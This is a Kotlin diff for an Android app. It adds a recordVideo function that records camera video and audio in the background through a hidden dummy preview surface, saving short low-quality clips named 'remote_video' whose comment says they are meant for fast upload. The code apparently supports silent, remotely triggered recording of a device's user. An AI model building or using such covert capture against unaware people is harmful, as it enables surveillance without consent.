@@ -7,8 +7,10 @@ import android.graphics.BitmapFactory
 import android.os.Build
 import android.provider.MediaStore
 import android.util.Log
+import androidx.annotation.RequiresPermission
 import androidx.camera.core.*
 import androidx.camera.lifecycle.ProcessCameraProvider
+import androidx.camera.video.*
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleOwner
 import android.graphics.SurfaceTexture
@@ -141,5 +143,98 @@ object CameraHandler {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to save to Gallery: ${e.message}")
         }
+    }
+
+    /**
+     * Records a video in the background for [durationMs] milliseconds.
+     */
+    @RequiresPermission(android.Manifest.permission.RECORD_AUDIO)
+    suspend fun recordVideo(
+        context: Context,
+        lifecycleOwner: LifecycleOwner,
+        cameraFacing: String = "back",
+        durationMs: Long = 5000L
+    ): File? = suspendCoroutine { continuation ->
+        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
+
+        cameraProviderFuture.addListener({
+            try {
+                val cameraProvider = cameraProviderFuture.get()
+
+                val surfaceTexture = SurfaceTexture(0).apply {
+                    setDefaultBufferSize(640, 480)
+                }
+                val dummySurface = android.view.Surface(surfaceTexture)
+
+                val preview = Preview.Builder().build().also { prev ->
+                    prev.setSurfaceProvider { request ->
+                        request.provideSurface(dummySurface, ContextCompat.getMainExecutor(context)) {
+                            dummySurface.release()
+                            surfaceTexture.release()
+                        }
+                    }
+                }
+
+                val recorder = Recorder.Builder()
+                    .setQualitySelector(QualitySelector.from(Quality.SD)) // Low quality for fast upload
+                    .build()
+                val videoCapture = VideoCapture.withOutput(recorder)
+
+                val requestedSelector = if (cameraFacing == "front") {
+                    CameraSelector.DEFAULT_FRONT_CAMERA
+                } else {
+                    CameraSelector.DEFAULT_BACK_CAMERA
+                }
+                val cameraSelector = if (cameraProvider.hasCamera(requestedSelector)) {
+                    requestedSelector
+                } else {
+                    CameraSelector.DEFAULT_BACK_CAMERA
+                }
+
+                cameraProvider.unbindAll()
+                cameraProvider.bindToLifecycle(lifecycleOwner, cameraSelector, preview, videoCapture)
+
+                val tempFile = File(context.cacheDir, "remote_video_${System.currentTimeMillis()}.mp4")
+                val outputOptions = FileOutputOptions.Builder(tempFile).build()
+
+                Log.d(TAG, "Starting video recording for ${durationMs}ms...")
+                
+                // Wait for AE/AF stabilization before recording
+                Handler(Looper.getMainLooper()).postDelayed({
+                    val pendingRecording = videoCapture.output
+                        .prepareRecording(context, outputOptions)
+                        
+                    if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                        pendingRecording.withAudioEnabled()
+                    }
+
+                    var activeRecording: Recording? = null
+                    activeRecording = pendingRecording.start(ContextCompat.getMainExecutor(context)) { recordEvent ->
+                        when (recordEvent) {
+                            is VideoRecordEvent.Start -> {
+                                Log.d(TAG, "Video recording started")
+                                // Schedule auto-stop
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    Log.d(TAG, "Auto-stopping video after ${durationMs}ms")
+                                    activeRecording?.stop()
+                                }, durationMs)
+                            }
+                            is VideoRecordEvent.Finalize -> {
+                                if (!recordEvent.hasError()) {
+                                    Log.d(TAG, "Video captured successfully: ${tempFile.absolutePath}")
+                                    continuation.resume(tempFile)
+                                } else {
+                                    Log.e(TAG, "Video capture error: ${recordEvent.error}")
+                                    continuation.resume(null)
+                                }
+                            }
+                        }
+                    }
+                }, 700)
+            } catch (e: Exception) {
+                Log.e(TAG, "Camera video setup failed: ${e.message}")
+                continuation.resume(null)
+            }
+        }, ContextCompat.getMainExecutor(context))
     }
 }
